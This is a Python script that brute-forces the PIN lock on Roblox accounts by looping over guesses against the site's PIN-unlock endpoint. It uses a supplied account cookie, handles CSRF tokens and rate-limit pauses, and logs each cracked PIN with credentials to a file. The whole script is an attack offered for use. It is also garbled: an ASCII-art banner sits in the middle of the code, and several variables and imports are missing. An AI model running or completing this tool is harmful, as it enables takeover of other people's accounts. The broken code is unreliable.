import requests
import re
import string
import time
import os

pingEveryone = True
print('')
print('Enter your cookie below:')
cookie = input()
os.system("cls")
print('')
print('Enter your webhook below:')
webhook = input()
os.system("cls")
print('')
print('Should we ping Everyone?: ( y / n )')
pingEveryone = input()
os.system("cls")
if pingEveryone.lower == 'y' or pingEveryone == 'yes':
    ping = '@everyone'
else:
    ping = '***Pin Cracked!***'
os.system("cls")

print('')


   _____                _        _  _____                _             
  / ____|              | |      | |/ ____|              | |            
 | |     _ __ _   _ ___| |_ __ _| | |     _ __ __ _  ___| | _____ _ __ 
 | |    | '__| | | / __| __/ _` | | |    | '__/ _` |/ __| |/ / _ \ '__|
 | |____| |  | |_| \__ \ || (_| | | |____| | | (_| | (__|   <  __/ |   
  \_____|_|   \__, |___/\__\__,_|_|\_____|_|  \__,_|\___|_|\_\___|_|   
               __/ |                                                   
              |___/                                                    
tried = 0
while 1:
    pin = pins.pop(0)
    os.system(f'title Pin Cracking {username} ~ Tried: {tried} ~ Current pin: {pin}')
    try:
        r = req.post('https://auth.roblox.com/v1/account/pin/unlock', json={'pin': pin})
        if 'X-CSRF-TOKEN' in r.headers:
            pins.insert(0, pin)
            req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
        elif 'errors' in r.json():
            code = r.json()['errors'][0]['code']
            if code == 0 and r.json()['errors'][0]['message'] == 'Authorization has been denied for this request.':
                print(f'[FAILURE] Account cookie expired.')
                break
            elif code == 1:
                print(f'[SUCCESS] NO PIN')
                with open('pins.txt','a') as f:
                    f.write(f'NO PIN:{credentials}\n')
                break
            elif code == 3 or '"message":"TooManyRequests"' in r.text:
                pins.insert(0, pin)
                print(f'[{datetime.now()}] Sleeping for 5 minutes.')
                time.sleep(60*5)
            elif code == 4:
                tried += 1
        elif 'unlockedUntil' in r.json():
            print(f'[SUCCESS] {pin}')
            with open('pins.txt','a') as f:
                f.write(f'{pin}:{credentials}\n')
            break
        else:
            pins.insert(0, pin)
            print(f'[ERROR] {r.text}')
    except Exception as e:
        print(f'[ERROR] {e}')
        pins.insert(0, pin)

input()
